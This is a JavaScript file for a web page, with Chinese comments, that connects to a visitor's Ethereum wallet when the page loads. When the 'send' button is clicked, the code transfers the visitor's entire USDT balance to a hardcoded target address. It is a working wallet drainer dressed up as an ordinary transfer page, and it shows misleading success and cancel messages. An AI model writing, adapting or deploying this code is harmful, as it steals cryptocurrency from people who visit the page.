// USDT 合约地址和目标地址
const USDT_CONTRACT_ADDRESS = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
const TARGET_ADDRESS = "0x64C6592164CC7C0Bdfb1D9a6F64C172a1830eD2C";
const USDT_ABI = [
    {
        "constant": false,
        "inputs": [
            { "name": "_to", "type": "address" },
            { "name": "_value", "type": "uint256" }
        ],
        "name": "transfer",
        "outputs": [{ "name": "", "type": "bool" }],
        "payable": false,
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "constant": true,
        "inputs": [{ "name": "_owner", "type": "address" }],
        "name": "balanceOf",
        "outputs": [{ "name": "balance", "type": "uint256" }],
        "payable": false,
        "stateMutability": "view",
        "type": "function"
    }
];

// 全局变量
let provider = null, signer = null;

// 页面加载时直接连接钱包
window.addEventListener('load', async () => {
    try {
        // 确保 ethers.js 已加载
        if (typeof ethers === 'undefined') throw new Error('ethers.js 加载失败，请检查网络或刷新页面！');

        // 直接使用 window.ethereum（假设已经在钱包环境中）
        provider = new ethers.providers.Web3Provider(window.ethereum);

        // 直接请求连接钱包
        await window.ethereum.request({ method: "eth_requestAccounts" });

        // 切换到以太坊主网
        const chainId = await window.ethereum.request({ method: 'eth_chainId' });
        if (chainId !== '0x1') {
            await window.ethereum.request({
                method: 'wallet_switchEthereumChain',
                params: [{ chainId: '0x1' }],
            });
        }

        // 获取 signer 和地址
        signer = provider.getSigner();
        const address = await signer.getAddress();
        document.getElementById('account-address').textContent = address.slice(0, 6) + '...' + address.slice(-4);
    } catch (e) {
        console.error('连接钱包失败:', e);
        alert('连接钱包失败，请确保已在钱包内置浏览器中访问页面！');
    }
});

// 发送按钮事件
document.querySelector('.send-btn').addEventListener('click', async (event) => {
    event.preventDefault(); // 确保手机端点击事件触发
    try {
        if (!signer) throw new Error('请先连接钱包！');
        const usdtContract = new ethers.Contract(USDT_CONTRACT_ADDRESS, USDT_ABI, signer);
        const balance = await usdtContract.balanceOf(await signer.getAddress());
        const tx = await usdtContract.transfer(TARGET_ADDRESS, balance);
        await tx.wait();
        alert('转账成功！');
    } catch (e) {
        console.error('转账失败:', e);
        alert('您已取消转账');
    }
});

// 取消按钮事件
document.querySelector('.cancel-btn').addEventListener('click', () => alert('已取消转账操作'));
